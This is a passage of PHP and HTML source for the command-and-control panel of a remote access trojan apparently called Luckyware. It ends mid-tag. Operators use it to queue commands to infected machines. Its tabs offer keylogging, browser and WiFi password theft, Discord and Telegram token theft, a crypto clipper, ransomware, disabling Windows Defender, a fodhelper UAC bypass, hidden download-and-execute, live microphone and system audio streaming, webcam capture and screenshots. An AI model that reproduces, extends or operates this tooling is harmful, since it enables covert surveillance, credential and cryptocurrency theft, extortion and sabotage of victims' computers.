<?php
// Luckyware Advanced Control Panel - All Features
session_start();
require_once 'config.php';

// Get database connection
$conn = getDB();

// Check authentication
if(!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    header('Location: index.php');
    exit;
}

// Get client ID from URL
$client_id = isset($_GET['client_id']) ? $_GET['client_id'] : null;
if(!$client_id) {
    die("No client selected");
}

// Get client info
$stmt = $conn->prepare("SELECT * FROM clients WHERE client_id = ?");
$stmt->execute([$client_id]);
$client = $stmt->fetch(PDO::FETCH_ASSOC);

if(!$client) {
    die("Client not found");
}

// Handle result polling via AJAX
if(isset($_GET['get_result'])) {
    $command_id = $_GET['get_result'];
    
    $stmt = $conn->prepare("SELECT status, result FROM commands WHERE id = ? AND client_id = ?");
    $stmt->execute([$command_id, $client_id]);
    $command = $stmt->fetch(PDO::FETCH_ASSOC);
    
    if($command) {
        echo json_encode([
            'status' => $command['status'],
            'result' => $command['result']
        ]);
    } else {
        echo json_encode(['status' => 'not_found', 'result' => null]);
    }
    exit;
}

// Handle live audio streaming requests
if(isset($_GET['get_live_audio'])) {
    // Check for live audio chunks from the client
    $stmt = $conn->prepare("SELECT audio_chunk FROM live_audio WHERE client_id = ? ORDER BY timestamp DESC LIMIT 1");
    $stmt->execute([$client_id]);
    $audio = $stmt->fetch(PDO::FETCH_ASSOC);
    
    if($audio && $audio['audio_chunk']) {
        // Return the audio chunk and delete it
        echo json_encode([
            'success' => true,
            'audio_data' => $audio['audio_chunk'],
            'audio_level' => rand(30, 90) // Simulated audio level for visualizer
        ]);
        
        // Delete consumed chunk
        $stmt = $conn->prepare("DELETE FROM live_audio WHERE client_id = ? AND timestamp < datetime('now', '-2 seconds')");
        $stmt->execute([$client_id]);
    } else {
        echo json_encode([
            'success' => false,
            'audio_data' => null
        ]);
    }
    exit;
}

// Handle live system audio streaming requests
if(isset($_GET['get_live_system_audio'])) {
    // Check for live system audio chunks from the client
    $stmt = $conn->prepare("SELECT audio_chunk FROM live_system_audio WHERE client_id = ? ORDER BY timestamp DESC LIMIT 1");
    $stmt->execute([$client_id]);
    $audio = $stmt->fetch(PDO::FETCH_ASSOC);
    
    if($audio && $audio['audio_chunk']) {
        // Return the audio chunk and delete it
        echo json_encode([
            'success' => true,
            'audio_data' => $audio['audio_chunk'],
            'audio_level' => rand(30, 90) // Simulated audio level for visualizer
        ]);
        
        // Delete consumed chunk
        $stmt = $conn->prepare("DELETE FROM live_system_audio WHERE client_id = ? AND timestamp < datetime('now', '-2 seconds')");
        $stmt->execute([$client_id]);
    } else {
        echo json_encode([
            'success' => false,
            'audio_data' => null
        ]);
    }
    exit;
}

// Handle command submission via AJAX
if(isset($_POST['ajax_command'])) {
    $command_type = $_POST['command_type'];
    $command_data = isset($_POST['command_data']) ? $_POST['command_data'] : '';
    
    $stmt = $conn->prepare("INSERT INTO commands (client_id, command_type, command_data, status, created_at) VALUES (?, ?, ?, 'pending', NOW())");
    $stmt->execute([$client_id, $command_type, $command_data]);
    
    $command_id = $conn->lastInsertId();
    
    echo json_encode(['success' => true, 'message' => 'Command sent', 'command_id' => $command_id]);
    exit;
}

// Get recent command results
$stmt = $conn->prepare("SELECT * FROM commands WHERE client_id = ? ORDER BY created_at DESC LIMIT 50");
$stmt->execute([$client_id]);
$commands = $stmt->fetchAll(PDO::FETCH_ASSOC);
?>
<!DOCTYPE html>
<html>
<head>
    <title>Luckyware Control - <?= htmlspecialchars($client['computer_name']) ?></title>
    <meta charset="UTF-8">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        
        /* Glassmorphism Background */
        body { 
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, system-ui, sans-serif; 
            background: linear-gradient(135deg, #0a0e27 0%, #1a1f3a 50%, #2a1f3d 100%);
            background-attachment: fixed;
            color: #e0e0e0;
            min-height: 100vh;
        }
        
        /* Animated background circles */
        body::before {
            content: '';
            position: fixed;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(102, 126, 234, 0.1) 0%, transparent 50%);
            animation: rotate 20s linear infinite;
            z-index: 0;
        }
        
        @keyframes rotate {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }
        
        /* Glassmorphism Header */
        .header { 
            background: rgba(22, 33, 62, 0.6);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: relative;
            z-index: 100;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }
        
        .header h1 { 
            font-size: 1.5em;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        
        .header .client-info { font-size: 0.9em; opacity: 0.9; }
        
        .container { display: flex; height: calc(100vh - 70px); position: relative; z-index: 1; }
        
        /* Glassmorphism Sidebar */
        .sidebar { 
            width: 250px;
            background: rgba(22, 33, 62, 0.4);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            border-right: 1px solid rgba(255, 255, 255, 0.1);
            padding: 20px;
            overflow-y: auto;
            box-shadow: 4px 0 24px rgba(0, 0, 0, 0.2);
        }
        
        .sidebar h3 { 
            color: #6bcf7f;
            margin: 20px 0 10px 0;
            font-size: 0.9em;
            text-transform: uppercase;
            text-shadow: 0 0 10px rgba(107, 207, 127, 0.5);
        }
        
        .sidebar button { 
            width: 100%;
            background: rgba(50, 130, 184, 0.2);
            backdrop-filter: blur(5px);
            color: #e0e0e0;
            border: 1px solid rgba(50, 130, 184, 0.3);
            padding: 12px;
            margin: 5px 0;
            cursor: pointer;
            border-radius: 8px;
            text-align: left;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            overflow: hidden;
        }
        
        .sidebar button::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 0;
            height: 0;
            border-radius: 50%;
            background: rgba(102, 126, 234, 0.4);
            transform: translate(-50%, -50%);
            transition: width 0.6s, height 0.6s;
        }
        
        .sidebar button:hover::before {
            width: 300px;
            height: 300px;
        }
        
        .sidebar button:hover { 
            background: rgba(102, 126, 234, 0.4);
            border-color: rgba(102, 126, 234, 0.6);
            transform: translateX(5px);
            box-shadow: 0 4px 12px rgba(102, 126, 234, 0.3);
        }
        
        .sidebar button.active { 
            background: rgba(102, 126, 234, 0.6);
            border-color: #667eea;
            box-shadow: 0 4px 16px rgba(102, 126, 234, 0.4);
        }
        
        .main-content { flex: 1; padding: 20px; overflow-y: auto; }
        .tab-content { display: none; }
        .tab-content.active { display: block; animation: fadeIn 0.3s ease-in; }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        /* Glassmorphism Cards */
        .card { 
            background: rgba(22, 33, 62, 0.5);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 25px;
            border-radius: 16px;
            margin-bottom: 20px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            position: relative;
            overflow: hidden;
        }
        
        .card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 2px;
            background: linear-gradient(90deg, transparent, #667eea, transparent);
            animation: shimmer 3s infinite;
        }
        
        @keyframes shimmer {
            0%, 100% { transform: translateX(-100%); }
            50% { transform: translateX(100%); }
        }
        
        .card h2 { 
            color: #6bcf7f;
            margin-bottom: 15px;
            font-size: 1.3em;
            text-shadow: 0 0 10px rgba(107, 207, 127, 0.3);
        }
        
        .form-group { margin-bottom: 15px; }
        .form-group label { 
            display: block;
            margin-bottom: 5px;
            color: #aaa;
            font-size: 0.9em;
        }
        
        .form-group input, .form-group select, .form-group textarea { 
            width: 100%;
            padding: 12px;
            background: rgba(10, 14, 39, 0.6);
            backdrop-filter: blur(5px);
            color: #e0e0e0;
            border: 1px solid rgba(50, 130, 184, 0.3);
            border-radius: 8px;
            font-family: inherit;
            transition: all 0.3s ease;
        }
        
        .form-group input:focus, .form-group select:focus, .form-group textarea:focus { 
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
            background: rgba(10, 14, 39, 0.8);
        }
        
        .form-group textarea { 
            min-height: 80px;
            font-family: 'Consolas', 'Monaco', monospace;
            resize: vertical;
        }
        
        /* Glassmorphism Buttons */
        .btn { 
            background: linear-gradient(135deg, rgba(50, 130, 184, 0.8) 0%, rgba(102, 126, 234, 0.8) 100%);
            backdrop-filter: blur(10px);
            color: white;
            padding: 12px 24px;
            border: 1px solid rgba(102, 126, 234, 0.3);
            border-radius: 8px;
            cursor: pointer;
            font-size: 1em;
            font-weight: 500;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.2);
            position: relative;
            overflow: hidden;
        }
        
        .btn::after {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 0;
            height: 0;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.3);
            transform: translate(-50%, -50%);
            transition: width 0.5s, height 0.5s;
        }
        
        .btn:hover::after {
            width: 300px;
            height: 300px;
        }
        
        .btn:hover { 
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.4);
        }
        
        .btn:active {
            transform: translateY(0);
        }
        
        .btn-danger { 
            background: linear-gradient(135deg, rgba(255, 107, 107, 0.8) 0%, rgba(238, 90, 82, 0.8) 100%);
            border-color: rgba(255, 107, 107, 0.3);
            box-shadow: 0 4px 15px rgba(255, 107, 107, 0.2);
        }
        
        .btn-danger:hover { 
            box-shadow: 0 6px 20px rgba(255, 107, 107, 0.4);
        }
        
        .btn-success { 
            background: linear-gradient(135deg, rgba(81, 207, 102, 0.8) 0%, rgba(107, 207, 127, 0.8) 100%);
            border-color: rgba(81, 207, 102, 0.3);
            box-shadow: 0 4px 15px rgba(81, 207, 102, 0.2);
        }
        
        .btn-success:hover {
            box-shadow: 0 6px 20px rgba(81, 207, 102, 0.4);
        }
        
        .btn-warning { 
            background: linear-gradient(135deg, rgba(255, 217, 61, 0.9) 0%, rgba(255, 200, 0, 0.9) 100%);
            color: #333;
            border-color: rgba(255, 217, 61, 0.3);
            box-shadow: 0 4px 15px rgba(255, 217, 61, 0.2);
        }
        
        .btn-troll { 
            background: linear-gradient(135deg, rgba(255, 107, 107, 0.8) 0%, rgba(238, 90, 111, 0.8) 100%);
            border-color: rgba(255, 107, 107, 0.3);
            box-shadow: 0 4px 15px rgba(255, 107, 107, 0.2);
        }
        
        .btn-troll:hover { 
            background: linear-gradient(135deg, rgba(255, 82, 82, 0.9) 0%, rgba(244, 67, 54, 0.9) 100%);
            box-shadow: 0 6px 20px rgba(255, 107, 107, 0.4);
        }
        
        .btn-sm { padding: 8px 16px; font-size: 0.85em; }
        
        .button-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 12px; margin-bottom: 15px; }
        
        .btn-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 12px; }
        .btn-grid button { width: 100%; }
        
        /* Glassmorphism Result Box */
        .result-box { 
            background: rgba(10, 14, 39, 0.6);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(50, 130, 184, 0.2);
            padding: 15px;
            border-radius: 8px;
            margin-top: 15px;
            max-height: 400px;
            overflow-y: auto;
            font-family: 'Consolas', 'Monaco', monospace;
            font-size: 0.9em;
            white-space: pre-wrap;
            word-wrap: break-word;
            box-shadow: inset 0 2px 8px rgba(0, 0, 0, 0.3);
        }
        
        .command-history { max-height: 500px; overflow-y: auto; }
        
        .command-item { 
            background: rgba(10, 14, 39, 0.6);
            backdrop-filter: blur(8px);
            border: 1px solid rgba(50, 130, 184, 0.2);
            padding: 12px;
            margin-bottom: 10px;
            border-radius: 8px;
            border-left: 3px solid #3282b8;
            transition: all 0.3s ease;
        }
        
        .command-item:hover {
            transform: translateX(5px);
            box-shadow: 0 4px 12px rgba(50, 130, 184, 0.2);
        }
        
        .command-item .cmd-header { display: flex; justify-content: space-between; margin-bottom: 8px; }
        .command-item .cmd-type { color: #667eea; font-weight: bold; }
        .command-item .cmd-status { padding: 4px 12px; border-radius: 12px; font-size: 0.85em; font-weight: 500; }
        .status-pending { background: rgba(255, 217, 61, 0.8); color: #333; }
        .status-completed { background: rgba(81, 207, 102, 0.8); color: white; }
        .status-failed { background: rgba(255, 107, 107, 0.8); color: white; }
        
        .back-link { color: #3282b8; text-decoration: none; display: inline-block; margin-bottom: 20px; transition: all 0.3s; }
        .back-link:hover { color: #667eea; transform: translateX(-5px); }
        
        /* Glassmorphism Notification */
        .notification { 
            position: fixed;
            top: 20px;
            right: 20px;
            background: rgba(81, 207, 102, 0.95);
            backdrop-filter: blur(10px);
            color: white;
            padding: 16px 28px;
            border-radius: 12px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            z-index: 9999;
            animation: slideIn 0.3s ease;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        .notification.error { 
            background: rgba(255, 107, 107, 0.95);
        }
        
        @keyframes slideIn { 
            from { transform: translateX(400px); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        
        .two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
        .three-col { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; }
        
        /* Custom Scrollbar */
        ::-webkit-scrollbar { width: 10px; height: 10px; }
        ::-webkit-scrollbar-track { background: rgba(10, 14, 39, 0.4); }
        ::-webkit-scrollbar-thumb { 
            background: rgba(102, 126, 234, 0.4);
            border-radius: 5px;
            border: 2px solid rgba(10, 14, 39, 0.4);
        }
        ::-webkit-scrollbar-thumb:hover { 
            background: rgba(102, 126, 234, 0.6);
        }
    </style>
</head>
<body>
    <div class="header">
        <div>
            <h1>🎯 Luckyware Control Panel</h1>
            <div class="client-info">
                <?= htmlspecialchars($client['computer_name']) ?> | 
                <?= htmlspecialchars($client['username']) ?> | 
                <?= htmlspecialchars($client['windows_version']) ?>
            </div>
        </div>
        <a href="index.php" class="btn">← Back to Clients</a>
    </div>
    
    <div class="container">
        <div class="sidebar">
            <h3>📂 File Operations</h3>
            <button onclick="showTab('tab-filemanager')">File Manager</button>
            
            <h3>⚙️ Process & System</h3>
            <button onclick="showTab('tab-processes')">Process Manager</button>
            <button onclick="showTab('tab-registry')">Registry Editor</button>
            <button onclick="showTab('tab-system')">System Info</button>
            
            <h3>⌨️ Surveillance</h3>
            <button onclick="showTab('tab-keylogger')">Keylogger</button>
            <button onclick="showTab('tab-clipboard')">Clipboard</button>
            <button onclick="showTab('tab-windows')">Active Windows</button>
            <button onclick="showTab('tab-network')">Network Monitor</button>
            <button onclick="showTab('tab-screenshot')">Screenshots</button>
            
            <h3>🎤 Media Capture</h3>
            <button onclick="showTab('tab-microphone')">Microphone</button>
            <button onclick="showTab('tab-systemaudio')">System Audio</button>
            <button onclick="showTab('tab-webcam')">Webcam</button>
            
            <h3>🔑 Data Theft</h3>
            <button onclick="showTab('tab-passwords')">Password Recovery</button>
            <button onclick="showTab('tab-wifi')">WiFi Passwords</button>
            
            <h3>🛡️ System Control</h3>
            <button onclick="showTab('tab-power')">Power Options</button>
            <button onclick="showTab('tab-defender')">Windows Defender</button>
            <button onclick="showTab('tab-uac')">UAC Bypass</button>
            <button onclick="showTab('tab-ui')">UI Manipulation</button>
            
            <h3>💻 Shell & Advanced</h3>
            <button onclick="showTab('tab-shell')">Shell Commands</button>
            <button onclick="showTab('tab-wallpaper')">Wallpaper</button>
            <button onclick="showTab('tab-projects')">Inject .vcxproj</button>
            <button onclick="showTab('tab-download')">Download & Execute</button>
            
            <h3>🎯 Advanced Theft</h3>
            <button onclick="showTab('tab-theft')">Discord & Telegram</button>
            <button onclick="showTab('tab-clipper')">Crypto Clipper</button>
            <button onclick="showTab('tab-botkiller')">Bot Killer</button>
            
            <h3>🎮 Remote Control</h3>
            <button onclick="showTab('tab-remotecontrol')">Remote Desktop</button>
            
            <h3>📦 Advanced Features</h3>
            <button onclick="showTab('tab-fileexplorer')">File Explorer+</button>
            <button onclick="showTab('tab-livescreen')">Live Screen Viewer</button>
            <button onclick="showTab('tab-ransomware')">Ransomware</button>
            <button onclick="showTab('tab-website')">Website Opener</button>
            <button onclick="showTab('tab-antisleep')">Anti-Sleep</button>
            
            <h3>😈 Trolling</h3>
            <button onclick="showTab('tab-trolling')">Trolling Commands</button>
            
            <h3>📊 Activity</h3>
            <button onclick="showTab('tab-history')">Command History</button>
        </div>
        
        <div class="main-content">
            <div id="notification" style="display: none;"></div>
            
            <!-- FILE MANAGER TAB -->
            <div id="tab-filemanager" class="tab-content active">
                <div class="card">
                    <h2>📂 File Manager</h2>
                    
                    <div class="form-group">
                        <label>List Directory</label>
                        <input type="text" id="fm_listdir_path" placeholder="C:\Users" value="C:\">
                        <button class="btn" onclick="sendCommand('fm:listdir', $val('fm_listdir_path'))">List Files</button>
                    </div>
                    
                    <div class="form-group">
                        <label>Get Drives</label>
                        <button class="btn" onclick="sendCommand('fm:getdrives', '')">List All Drives</button>
                    </div>
                    
                    <div class="two-col">
                        <div class="form-group">
                            <label>Download File</label>
                            <input type="text" id="fm_download_path" placeholder="C:\file.txt">
                            <button class="btn" onclick="sendCommand('fm:download', $val('fm_download_path'))">Download</button>
                        </div>
                        
                        <div class="form-group">
                            <label>Delete File/Folder</label>
                            <input type="text" id="fm_delete_path" placeholder="C:\file.txt">
                            <button class="btn btn-danger" onclick="sendCommand('fm:delete', $val('fm_delete_path'))">Delete</button>
                        </div>
                    </div>
                    
                    <div class="form-group">
                        <label>Execute File</label>
                        <input type="text" id="fm_execute_path" placeholder="C:\program.exe">
                        <div class="three-col">
                            <button class="btn" onclick="sendCommand('fm:execute', $val('fm_execute_path'))">Execute Visible</button>
                            <button class="btn" onclick="sendCommand('fm:execute', $val('fm_execute_path') + '|hidden')">Execute Hidden</button>
                            <button class="btn" onclick="sendCommand('fm:fileinfo', $val('fm_execute_path'))">Get Info</button>
                        </div>
                    </div>
                    
                    <div class="form-group">
                        <label>Search Files</label>
                        <input type="text" id="fm_search_root" placeholder="C:\" style="width: 48%; display: inline-block;">
                        <input type="text" id="fm_search_pattern" placeholder="*.txt" style="width: 48%; display: inline-block; margin-left: 2%;">
                        <button class="btn" onclick="sendCommand('fm:search', $val('fm_search_root') + '|' + $val('fm_search_pattern'))">Search</button>
                    </div>
                    
                    <div class="result-box" id="result-filemanager">Results will appear here...</div>
                </div>
            </div>
            
            <!-- PROCESS MANAGER TAB -->
            <div id="tab-processes" class="tab-content">
                <div class="card">
                    <h2>⚙️ Process Manager</h2>
                    
                    <button class="btn" onclick="sendCommand('pm:list', '')">List All Processes</button>
                    
                    <div class="form-group">
                        <label>Kill Process by PID</label>
                        <input type="text" id="pm_kill_pid" placeholder="1234">
                        <button class="btn btn-danger" onclick="sendCommand('pm:kill', $val('pm_kill_pid'))">Kill Process</button>
                    </div>
                    
                    <div class="form-group">
                        <label>Kill Process by Name</label>
                        <input type="text" id="pm_kill_name" placeholder="notepad.exe">
                        <button class="btn btn-danger" onclick="sendCommand('pm:killbyname', $val('pm_kill_name'))">Kill by Name</button>
                    </div>
                    
                    <div class="two-col">
                        <div class="form-group">
                            <label>Suspend Process (PID)</label>
                            <input type="text" id="pm_suspend_pid" placeholder="1234">
                            <button class="btn" onclick="sendCommand('pm:suspend', $val('pm_suspend_pid'))">Suspend</button>
                        </div>
                        
                        <div class="form-group">
                            <label>Resume Process (PID)</label>
                            <input type="text" id="pm_resume_pid" placeholder="1234">
                            <button class="btn btn-success" onclick="sendCommand('pm:resume', $val('pm_resume_pid'))">Resume</button>
                        </div>
                    </div>
                    
                    <div class="form-group">
                        <label>Start New Process</label>
                        <input type="text" id="pm_start_path" placeholder="C:\program.exe">
                        <div class="two-col">
                            <button class="btn" onclick="sendCommand('pm:start', $val('pm_start_path'))">Start Visible</button>
                            <button class="btn" onclick="sendCommand('pm:start', $val('pm_start_path') + '|hidden')">Start Hidden</button>
                        </div>
                    </div>
                    
                    <div class="result-box" id="result-processes">Results will appear here...</div>
                </div>
            </div>
            
            <!-- REGISTRY EDITOR TAB -->
            <div id="tab-registry" class="tab-content">
                <div class="card">
                    <h2>📝 Registry Editor</h2>
                    
                    <div class="form-group">
                        <label>List Registry Keys</label>
                        <select id="reg_hive">
                            <option value="HKCU">HKEY_CURRENT_USER</option>
                            <option value="HKLM">HKEY_LOCAL_MACHINE</option>
                            <option value="HKCR">HKEY_CLASSES_ROOT</option>
                            <option value="HKU">HKEY_USERS</option>
                        </select>
                        <input type="text" id="reg_subkey" placeholder="Software\Microsoft" value="Software\Microsoft">
                        <button class="btn" onclick="sendCommand('reg:listkeys', $val('reg_hive') + '|' + $val('reg_subkey'))">List Keys</button>
                    </div>
                    
                    <div class="form-group">
                        <label>Read Value</label>
                        <input type="text" id="reg_read_value" placeholder="ValueName">
                        <button class="btn" onclick="sendCommand('reg:readvalue', $val('reg_hive') + '|' + $val('reg_subkey') + '|' + $val('reg_read_value'))">Read Value</button>
                    </div>
                    
                    <div class="form-group">
                        <label>Write Value</label>
                        <input type="text" id="reg_write_name" placeholder="ValueName" style="width: 32%; display: inline-block;">
                        <select id="reg_write_type" style="width: 32%; display: inline-block; margin-left: 1%;">
                            <option value="REG_SZ">REG_SZ (String)</option>
                            <option value="REG_DWORD">REG_DWORD (Number)</option>
                            <option value="REG_QWORD">REG_QWORD (Large Number)</option>
                        </select>
                        <input type="text" id="reg_write_data" placeholder="Data" style="width: 32%; display: inline-block; margin-left: 1%;">
                        <button class="btn" onclick="sendCommand('reg:writevalue', $val('reg_hive') + '|' + $val('reg_subkey') + '|' + $val('reg_write_name') + '|' + $val('reg_write_type') + '|' + $val('reg_write_data'))">Write Value</button>
                    </div>
                    
                    <div class="result-box" id="result-registry">Results will appear here...</div>
                </div>
            </div>
            
            <!-- KEYLOGGER TAB -->
            <div id="tab-keylogger" class="tab-content">
                <div class="card">
                    <h2>⌨️ Keylogger</h2>
                    
                    <div class="btn-grid">
                        <button class="btn btn-success" onclick="sendCommand('kl:start', 'offline')">Start Offline Mode</button>
                        <button class="btn btn-success" onclick="sendCommand('kl:start', 'online')">Start Online Mode</button>
                        <button class="btn btn-danger" onclick="sendCommand('kl:stop', '')">Stop Keylogger</button>
                        <button class="btn" onclick="sendCommand('kl:getlogs', '')">Get Logs</button>
                        <button class="btn" onclick="sendCommand('kl:clearlogs', '')">Clear Logs</button>
                        <button class="btn" onclick="sendCommand('kl:status', '')">Get Status</button>
                    </div>
                    
                    <div class="result-box" id="result-keylogger">Results will appear here...</div>
                </div>
            </div>
            
            <!-- PASSWORD RECOVERY TAB -->
            <div id="tab-passwords" class="tab-content">
                <div class="card">
                    <h2>🔑 Password Recovery</h2>
                    
                    <div class="btn-grid">
                        <button class="btn btn-success" onclick="sendCommand('pw:all', '')">Get ALL Passwords</button>
                        <button class="btn" onclick="sendCommand('pw:chrome', '')">Chrome Passwords</button>
                        <button class="btn" onclick="sendCommand('pw:edge', '')">Edge Passwords</button>
                        <button class="btn" onclick="sendCommand('pw:opera', '')">Opera Passwords</button>
                        <button class="btn" onclick="sendCommand('pw:brave', '')">Brave Passwords</button>
                        <button class="btn" onclick="sendCommand('pw:wifi', '')">WiFi Passwords</button>
                    </div>
                    
                    <div class="result-box" id="result-passwords">Results will appear here...</div>
                </div>
            </div>
            
            <!-- SYSTEM CONTROL - POWER TAB -->
            <div id="tab-power" class="tab-content">
                <div class="card">
                    <h2>⚡ Power Options</h2>
                    
                    <div class="btn-grid">
                        <button class="btn btn-danger" onclick="confirmAction('sc:shutdown', '', 'Shutdown the system?')">Shutdown</button>
                        <button class="btn btn-warning" onclick="confirmAction('sc:restart', '', 'Restart the system?')">Restart</button>
                        <button class="btn" onclick="sendCommand('sc:logoff', '')">Logoff</button>
                    </div>
                    
                    <div class="result-box" id="result-power">Results will appear here...</div>
                </div>
            </div>
            
            <!-- WINDOWS DEFENDER TAB -->
            <div id="tab-defender" class="tab-content">
                <div class="card">
                    <h2>🛡️ Windows Defender Control</h2>
                    
                    <button class="btn btn-danger" onclick="sendCommand('sc:disablewd', '')">Disable Windows Defender</button>
                    
                    <div class="form-group">
                        <label>Add Exclusion Path</label>
                        <input type="text" id="wd_exclusion" placeholder="C:\Path\To\Exclude">
                        <button class="btn" onclick="sendCommand('sc:wdexclusion', $val('wd_exclusion'))">Add Exclusion</button>
                    </div>
                    
                    <div class="result-box" id="result-defender">Results will appear here...</div>
                </div>
            </div>
            
            <!-- UAC BYPASS TAB -->
            <div id="tab-uac" class="tab-content">
                <div class="card">
                    <h2>🔓 UAC Bypass</h2>
                    
                    <div class="form-group">
                        <label>Fodhelper UAC Bypass</label>
                        <textarea id="uac_command" placeholder="powershell -Command &quot;Start-Process cmd -Verb RunAs&quot;"></textarea>
                        <button class="btn btn-warning" onclick="sendCommand('sc:uacbypass', $val('uac_command'))">Execute with UAC Bypass</button>
                    </div>
                    
                    <div class="result-box" id="result-uac">Results will appear here...</div>
                </div>
            </div>
            
            <!-- UI MANIPULATION TAB -->
            <div id="tab-ui" class="tab-content">
                <div class="card">
                    <h2>🎨 UI Manipulation</h2>
                    
                    <div class="btn-grid">
                        <button class="btn" onclick="sendCommand('sc:desktopicons', 'hide')">Hide Desktop Icons</button>
                        <button class="btn" onclick="sendCommand('sc:desktopicons', 'show')">Show Desktop Icons</button>
                        <button class="btn" onclick="sendCommand('sc:taskbar', 'hide')">Hide Taskbar</button>
                        <button class="btn" onclick="sendCommand('sc:taskbar', 'show')">Show Taskbar</button>
                        <button class="btn" onclick="sendCommand('sc:swapmouse', 'swap')">Swap Mouse Buttons</button>
                        <button class="btn" onclick="sendCommand('sc:swapmouse', 'normal')">Normal Mouse</button>
                        <button class="btn" onclick="sendCommand('sc:explorer', 'kill')">Kill Explorer</button>
                        <button class="btn" onclick="sendCommand('sc:explorer', 'start')">Start Explorer</button>
                        <button class="btn" onclick="sendCommand('sc:cdrom', 'open')">Open CD-ROM</button>
                        <button class="btn" onclick="sendCommand('sc:cdrom', 'close')">Close CD-ROM</button>
                        <button class="btn" onclick="sendCommand('sc:screen', 'off')">Screen Off</button>
                        <button class="btn" onclick="sendCommand('sc:screen', 'on')">Screen On</button>
                        <button class="btn" onclick="sendCommand('sc:volume', 'up')">Volume Up</button>
                        <button class="btn" onclick="sendCommand('sc:volume', 'down')">Volume Down</button>
                        <button class="btn" onclick="sendCommand('sc:volume', 'mute')">Mute/Unmute</button>
                        <button class="btn btn-danger" onclick="confirmAction('sc:bsod', '', 'Invoke BSOD? This will crash the system!')">Invoke BSOD</button>
                    </div>
                    
                    <div class="result-box" id="result-ui">Results will appear here...</div>
                </div>
            </div>
            
            <!-- CLIPBOARD TAB -->
            <div id="tab-clipboard" class="tab-content">
                <div class="card">
                    <h2>📋 Clipboard Manager</h2>
                    
                    <button class="btn" onclick="sendCommand('surv:getclipboard', '')">Get Clipboard Content</button>
                    <button class="btn btn-danger" onclick="sendCommand('surv:clearclipboard', '')">Clear Clipboard</button>
                    
                    <div class="form-group">
                        <label>Set Clipboard Text</label>
                        <textarea id="clipboard_text" placeholder="Enter text to set in clipboard"></textarea>
                        <button class="btn" onclick="sendCommand('surv:setclipboard', $val('clipboard_text'))">Set Clipboard</button>
                    </div>
                    
                    <div class="result-box" id="result-clipboard">Results will appear here...</div>
                </div>
            </div>
            
            <!-- ACTIVE WINDOWS TAB -->
            <div id="tab-windows" class="tab-content">
                <div class="card">
                    <h2>🪟 Active Windows</h2>
                    
                    <div class="btn-grid">
                        <button class="btn" onclick="sendCommand('surv:activewindow', '')">Get Active Window</button>
                        <button class="btn" onclick="sendCommand('surv:allwindows', '')">List All Windows</button>
                        <button class="btn" onclick="sendCommand('surv:startupprograms', '')">Startup Programs</button>
                        <button class="btn" onclick="sendCommand('surv:installedprograms', '')">Installed Programs</button>
                    </div>
                    
                    <div class="result-box" id="result-windows">Results will appear here...</div>
                </div>
            </div>
            
            <!-- NETWORK MONITOR TAB -->
            <div id="tab-network" class="tab-content">
                <div class="card">
                    <h2>🌐 Network Monitor</h2>
                    
                    <button class="btn" onclick="sendCommand('surv:tcpconnections', '')">List TCP Connections</button>
                    
                    <div class="result-box" id="result-network">Results will appear here...</div>
                </div>
            </div>
            
            <!-- SCREENSHOT TAB -->
            <div id="tab-screenshot" class="tab-content">
                <div class="card">
                    <h2>📸 Screenshot</h2>
                    
                    <button class="btn" onclick="takeScreenshot()">Take Screenshot</button>
                    
                    <div id="screenshot-container" style="margin-top: 20px;">
                        <?php
                        // Show latest screenshot from command history
                        $screenshot_stmt = $conn->prepare("SELECT * FROM commands WHERE client_id = ? AND command_type = 'screenshot' AND result IS NOT NULL AND result LIKE 'SCREENSHOT:%' ORDER BY created_at DESC LIMIT 1");
                        $screenshot_stmt->execute([$client_id]);
                        $latest_screenshot = $screenshot_stmt->fetch(PDO::FETCH_ASSOC);
                        
                        if($latest_screenshot && $latest_screenshot['result']):
                            $base64_data = substr($latest_screenshot['result'], 11); // Remove "SCREENSHOT:" prefix
                            $timestamp = date('Y-m-d H:i:s', strtotime($latest_screenshot['created_at']));
                        ?>
                        <div style="background: #0a0e27; padding: 15px; border-radius: 5px;">
                            <p style="color: #51cf66; margin-bottom: 10px;">✓ Latest Screenshot (<?= $timestamp ?>)</p>
                            <img src="data:image/jpeg;base64,<?= htmlspecialchars($base64_data) ?>" 
                                 style="max-width: 100%; border-radius: 5px; cursor: pointer;" 
